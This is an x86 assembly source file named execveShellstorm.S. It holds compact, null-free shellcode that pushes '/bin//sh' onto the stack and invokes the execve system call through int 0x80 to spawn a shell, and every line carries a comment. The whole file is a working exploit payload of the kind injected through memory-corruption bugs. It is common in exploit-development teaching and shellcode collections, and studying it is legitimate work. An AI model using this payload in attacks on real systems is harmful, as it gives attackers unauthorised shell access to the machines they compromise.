// execveShellstorm.S
.global _start
_start:
    xor    %eax,%eax      # Zero EAX register
    push   %eax           # Push NULL terminator
    push   $0x68732f2f    # Push "//sh"
    push   $0x6e69622f    # Push "/bin"
    mov    %esp,%ebx      # First arg: filename pointer
    push   %eax           # Push NULL
    push   %ebx           # Push argv[0]
    mov    %esp,%ecx      # Second arg: argv pointer
    mov    $0xb,%al       # syscall number for execve
    int    $0x80          # Make syscall
